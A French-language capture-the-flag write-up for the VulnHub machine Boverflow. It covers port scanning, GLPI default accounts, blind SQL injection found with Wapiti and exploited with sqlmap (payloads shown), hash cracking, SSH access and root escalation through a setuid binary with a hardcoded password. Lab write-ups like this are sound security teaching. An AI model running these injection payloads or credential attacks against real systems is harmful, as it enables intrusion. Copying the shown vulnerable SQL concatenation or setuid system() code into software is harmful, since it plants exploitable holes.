# Solution du CTF Boverflow de VulnHub

Slow Life
---------

[Boverflow](https://www.vulnhub.com/entry/boverflow-1,572/ "Boverflow") est un CTF créé par *foxlox*, auteur de différents CTFs proposé sur VulnHub.  

La description du CTF nous prévient que nos paquets pourraient être DROPés si on charge un peu trop la mule, c'est vraisemblablement dû à la présence d'un *fail2ban*.

Pour un scan de port ça semble passer. Le port 80 nous redirige directement sur une installation de [GLPI](http://glpi-project.org/ "GLPI").

```plain

Nmap scan report for 192.168.56.22
Host is up (0.00014s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 09:0a:c8:cb:7e:d7:3a:f0:5b:3d:c3:ab:1e:dd:a9:f1 (RSA)
|   256 d4:f2:ee:8c:d0:61:74:31:df:6b:5b:e1:c9:de:21:ad (ECDSA)
|_  256 0a:be:d2:86:51:c0:e9:2c:92:ed:15:5e:3c:e1:14:1c (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
| http-title: GLPI - Authentication
|_Requested resource was http://192.168.56.22/glpi/
|_http-server-header: Apache/2.4.38 (Debian)

```

Ce site nous demande directement des identifiants, il ne semble pas y avoir d'accès publique.  

Une petite recherche sur Internet m'amène sur [ce forum](https://forum.glpi-project.org/viewtopic.php?id=23219 "ce forum") qui liste les comptes par défaut de ce logiciel. Tous ont un mot de passe par défaut qui correspond au nom d'utilisateur :

```plain

you have 4 differents profils
glpi/glpi (super-admin)
tech/tech
postonly/postonly (only for helpdesk)
normal/normal

```

J'ai testé rapidement et le compte *normal* fonctionne. Toutefois il ne semble pas assez privilégié pour ajouter des éléments via l'interface.  

Un exploit pour GLPI existe et [est détaillé dans cet article](https://offsec.almond.consulting/playing-with-gzip-rce-in-glpi.html "est détaillé dans cet article"). Il y a un code d'exploitation publié sur exploit-db et en le lisant on comprends qu'il créé une entrée via la secion *Wifi Networks.*  

Notre compte actuel ne permet donc pas cette exploitation.  

Timmy The Turtle
----------------

Via *feroxbuster* je trouve une mire de login à l'adresse [http://192.168.56.22/admin/](http://192.168.56.22/admin/ "http://192.168.56.22/admin/").  

On peut lancer Wapiti dessus en ne sélectionnant que le ou les modules les plus à même de remonter quelque chose d'intéressant afin d'éviter le ban sur la quantité de requêtes :

```plain
$ wapiti -u http://192.168.56.24/admin/ --color -m timesql -v2
[*] Lancement du module timesql
---
Vulnérabilité d'injection SQL en aveugle dans http://192.168.56.22/admin/verify.php via une injection dans le paramètre username
Evil request:
	POST /admin/verify.php HTTP/1.1
	Host: 192.168.56.22
	Referer: http://192.168.56.22/admin/
	Content-Type: application/x-www-form-urlencoded

	username=%27%20or%20sleep%287%29%231&password=Letm3in_
---
---
Vulnérabilité d'injection SQL en aveugle dans http://192.168.56.22/admin/verify.php via une injection dans le paramètre password
Evil request:
	POST /admin/verify.php HTTP/1.1
	Host: 192.168.56.22
	Referer: http://192.168.56.22/admin/
	Content-Type: application/x-www-form-urlencoded

	username=alice&password=%27%20or%20sleep%287%29%231
---

```

Nice ! On peut enchainer avec SQLmap mais en mode *vas-y molo*. Ça passe en utilisant l'option *delay* mais SQLmap ne la respecte pas vraiment puisqu'il faudrait aussi limiter le parallélisme à un seul thread pour que ce soit effectif.

```plain

$ python sqlmap.py -u http://192.168.56.24/admin/verify.php --data "username=admin&password=password" --dbms mysql --risk 3 --level 5 --delay 5

sqlmap identified the following injection point(s) with a total of 1328 HTTP(s) requests:
---
Parameter: username (POST)
	Type: error-based
	Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
	Payload: username=admin'||(SELECT 0x43724275 FROM DUAL WHERE 6495=6495 AND (SELECT 4399 FROM(SELECT COUNT(*),CONCAT(0x716b707a71,(SELECT (ELT(4399=4399,1))),0x71766a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||'&password=password

	Type: time-based blind
	Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
	Payload: username=admin'||(SELECT 0x57544e49 FROM DUAL WHERE 9937=9937 AND (SELECT 9840 FROM (SELECT(SLEEP(5)))WtOD))||'&password=password
---

```

On trouve alors différentes DBs et la courante dispose d'un hash :

```plain

available databases [3]:
[*] basedb
[*] glpi
[*] information_schema

```

```plain

Database: basedb
Table: passwd
[1 entry]
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
| 1  | fox      | be073f86255a6d45d4392ca8fc226e73 |
+----+----------+----------------------------------+

```

Le hash est vite cassé via CrackStation (cleartext : *moanapozzi*).  

J'ai aussi extrais les hashs des users GLPI mais impossible de casser le compte privilégié *glpi*...

Lazy Fox
--------

Les identifiants de la base de donnés nous fournissent finalement un accès via SSH.

```plain

fox@boverflow:~$ cat user.txt 
a7de9153594943377ea6e508f5561a67

```

On trouve dans le dossier de l'utilisateur un binaire *mysudo* et son code source associé que voici :

```c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>

char cmd[100];

void execute()
{
	printf("Command output:\n");
	if (cmd) system(cmd);
}

void echo()
{
	printf("\nWelcome to mysudo tool, you can run a command on the system as root.\n\ndon't try brute force, it's impossible!\n\n");
		setuid(0);
	char username[20],password[20];
	printf("Command: ");
	scanf("%s", cmd);
	printf("Username: ");
	scanf("%s", username);
	printf("Password: ");
	scanf("%s", password);
	if ((!strcmp(username,"username"))&&(!strcmp(password,"password")))
	 execute(); 
	else
	 printf("Wrong username or password!\n");
}

int main()
{
	echo();
	return 0;
}

```

Evidemment si on effectue un strings sur le fichier on obtient des chaines sensiblement différentes (le mot de passe attendu a été changé).  

On peut aussi débugger le binaire avec gdb, désassembler la méthode *echo* et placer les breakpoints sur les appels à *strcmp*.  

Une inspection des registres *rdi* et *rsi* permettront ainsi de voir les chaines comparées.

```plain

Command output:
Welcome to mysudo tool, you can run a command on the system as root.
don't try brute force, it's impossible!
Command: 
Username: 
Password: 
username
passworaaaaaaaaaaaaaa
Wrong username or password!

```

On trouve la chaine *passworaaaaaaaaaaaaaa* qui n'est pas dans le code C.

```plain

fox@boverflow:~$ ./mysudo 

Welcome to mysudo tool, you can run a command on the system as root.

don't try brute force, it's impossible!

Command: bash
Username: username
Password: passworaaaaaaaaaaaaaa
Command output:
root@boverflow:~# id
uid=0(root) gid=1000(fox) groups=1000(fox),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
root@boverflow:~# cd /root
root@boverflow:/root# ls
root.txt
root@boverflow:/root# cat root.txt 
9057703b55b8943d91cad17ac3c4920f

```

Et voilà !  

Un petit coup d'oeil au fichier verify.php nous permet de voir comment était formé la requête SQL :  

```php
$q="select count(*) from passwd where username='".$_POST['username']."' and password='".$_POST['password']."';";
```



*Published January 11 2022 at 20 06*